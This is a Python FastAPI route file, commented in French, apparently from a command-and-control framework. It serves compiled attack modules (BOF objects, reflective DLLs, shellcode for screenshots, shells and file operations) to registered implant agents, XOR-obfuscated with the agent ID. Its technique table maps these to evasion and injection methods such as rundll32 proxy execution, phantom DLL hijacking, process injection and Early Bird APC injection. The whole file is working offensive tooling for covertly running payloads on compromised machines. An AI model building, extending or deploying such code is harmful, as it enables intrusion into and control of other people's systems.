# ============================================================
#  server/routes/modules.py — Distribution des modules BOF/DLL
#
#  Rôle : Sert les modules pré-compilés aux agents qui en font
#         la demande lors de l'exécution d'une tâche dynamique.
#
#  Endpoint :
#    GET /agent/modules/{module_name}?technique=bof&arch=x64
#
#  Structure des fichiers :
#    server/modules/
#      ├── screenshot/
#      │   ├── screenshot.x64.o   ← BOF 64 bits
#      │   ├── screenshot.x86.o   ← BOF 32 bits
#      │   ├── screenshot.x64.dll ← Reflective DLL (futur)
#      │   └── screenshot.x64.bin ← Shellcode (futur)
#      ├── sysinfo/
#      │   ├── sysinfo.x64.o
#      │   └── sysinfo.x86.o
#      ├── shell/
#      │   └── shell.x64.o
#      └── fileops/
#          └── fileops.x64.o
#
#  Sécurité :
#    - Vérification que le chemin reste dans MODULES_DIR
#    - Seules les extensions connues sont servies
#    - L'agent_id doit être enregistré et sert de clé XOR de transport
# ============================================================

import base64
import os
from fastapi import APIRouter, HTTPException, Query
from fastapi.responses import JSONResponse

import database as db
from payload_obfuscation import EncryptPayload

router = APIRouter(prefix="/agent/modules", tags=["Modules"])

# Répertoire racine des modules compilés (relatif à server/)
MODULES_DIR = os.path.normpath(
    os.path.join(os.path.dirname(__file__), "..", "modules")
)

# Mapping : technique → extension de fichier selon l'arch
TECHNIQUE_EXT = {
    "bof":       "{arch}.o",     # COFF Object File (.x64.o)
    "rdll":      "{arch}.dll",   # Reflective DLL   (.x64.dll)
    "rundll32":  "{arch}.dll",   # Signed Binary Proxy T1218.011 — mêmes DLL que rdll
    "wpr":       "{arch}.dll",   # Phantom DLL wpr.exe    T1574.002 — mêmes DLL que rdll
    "wermgr":    "{arch}.dll",   # Phantom DLL wermgr.exe T1574.002 — mêmes DLL que rdll
    "shellcode": "{arch}.bin",   # sRDI/Shellcode   (.x64.bin)
    "inject":    "{arch}.bin",   # Process Injection (.x64.bin — même format que shellcode)
    "apc":       "{arch}.dll",   # Self-APC (T1055) — délègue en interne à rdll_loader, même DLL que rdll
    "apcinject": "{arch}.bin",   # Early Bird APC cross-process (T1055.004) — shellcode brut
    "src":       "c",            # Source C — futur (Linux)
}

# Extensions autorisées (protection contre l'exécution de fichiers arbitraires)
ALLOWED_EXTENSIONS = {".o", ".dll", ".bin", ".c"}


@router.get("/{module_name}")
async def get_module(
    module_name: str,
    technique: str = Query("rdll", description="Technique: bof | rdll | shellcode | inject | src"),
    arch:      str = Query("x64",  description="Architecture: x64 | x86"),
    agent_id:  str = Query(..., min_length=1, description="Target agent ID")
):
    """
    Sert le binaire d'un module à l'agent qui en fait la demande.

    Flux typique :
      1. L'opérateur envoie: screenshot -t bof agent_X
      2. Le serveur crée une tâche avec technique="bof", module="screenshot"
      3. L'agent poll et reçoit la tâche
      4. L'agent appelle GET /api/modules/screenshot?technique=bof&arch=x64
      5. Ce endpoint retourne une trame JSON avec le binaire XOR-obfusqué
      6. L'agent décode, déchiffre en mémoire puis exécute le BOF
      7. L'agent envoie le résultat au serveur
    """
    # Validation des paramètres
    technique = technique.lower().strip()
    arch      = arch.lower().strip()

    if technique not in TECHNIQUE_EXT:
        raise HTTPException(
            status_code=400,
            detail=f"Technique inconnue: '{technique}'. "
                   f"Valeurs: {list(TECHNIQUE_EXT.keys())}"
        )

    if arch not in ("x64", "x86", "arm64"):
        raise HTTPException(
            status_code=400,
            detail=f"Architecture inconnue: '{arch}'. Valeurs: x64, x86, arm64"
        )

    # Validation du nom de module (protection injection de chemin)
    if not module_name.replace("_", "").replace("-", "").isalnum():
        raise HTTPException(status_code=400, detail="Nom de module invalide")

    # Construction du nom de fichier
    ext_template = TECHNIQUE_EXT[technique]
    filename     = f"{module_name}.{ext_template.format(arch=arch)}"

    # Construction du chemin complet
    module_path = os.path.normpath(
        os.path.join(MODULES_DIR, module_name, filename)
    )

    # Protection path traversal : vérifier que le chemin est dans MODULES_DIR
    modules_abs = os.path.normpath(os.path.abspath(MODULES_DIR))
    module_abs  = os.path.normpath(os.path.abspath(module_path))

    if not module_abs.startswith(modules_abs):
        raise HTTPException(status_code=400, detail="Chemin invalide")

    # Vérification de l'extension
    _, ext = os.path.splitext(filename)
    if ext not in ALLOWED_EXTENSIONS:
        raise HTTPException(status_code=400, detail=f"Extension non autorisée: {ext}")

    # Vérification de l'existence du fichier
    if not os.path.isfile(module_path):
        hint = {
            "bof":       "make bof-x64",
            "rdll":      "make dll-x64",
            "rundll32":  "make dll-x64",
            "wpr":       "make dll-x64",
            "wermgr":    "make dll-x64",
            "shellcode": "make dll-x64 && python3 server/srdi.py --all",
            "inject":    "make dll-x64 && python3 server/srdi.py --all",
            "apc":       "make dll-x64",
            "apcinject": "make dll-x64 && python3 server/srdi.py --all",
            "src":       "non supporté",
        }.get(technique, "make dll-x64")
        raise HTTPException(
            status_code=404,
            detail=f"Module '{module_name}' non disponible "
                   f"(technique={technique}, arch={arch}). "
                   f"Compilez d'abord : {hint}"
        )

    if not await db.get_agent_by_id(agent_id):
        raise HTTPException(status_code=404, detail="Agent inconnu")

    with open(module_path, "rb") as module_file:
        payload = module_file.read()
    encrypted_payload = EncryptPayload(payload, agent_id)
    print(f"[MODULE] Servi obfusqué: {module_name}/{filename} ({len(payload)} bytes)")

    return JSONResponse({
        "module": module_name,
        "technique": technique,
        "arch": arch,
        "encoding": "base64",
        "obfuscation": "xor-v1",
        "payload": base64.b64encode(encrypted_payload).decode("ascii"),
    })


@router.get("/")
async def list_modules():
    """
    Liste tous les modules disponibles avec leurs formats compilés.
    Utile pour vérifier ce qui est prêt avant d'envoyer une tâche.
    """
    available = {}

    if not os.path.isdir(MODULES_DIR):
        return {"modules": {}, "message": "Répertoire modules/ vide ou inexistant"}

    for module_name in sorted(os.listdir(MODULES_DIR)):
        module_dir = os.path.join(MODULES_DIR, module_name)
        if not os.path.isdir(module_dir):
            continue

        available[module_name] = {}
        for technique, ext_tpl in TECHNIQUE_EXT.items():
            available[module_name][technique] = {}
            for arch in ("x64", "x86"):
                fname = f"{module_name}.{ext_tpl.format(arch=arch)}"
                fpath = os.path.join(module_dir, fname)
                available[module_name][technique][arch] = {
                    "filename":  fname,
                    "available": os.path.isfile(fpath),
                    "size":      os.path.getsize(fpath) if os.path.isfile(fpath) else 0,
                }

    return {"modules": available, "modules_dir": MODULES_DIR}
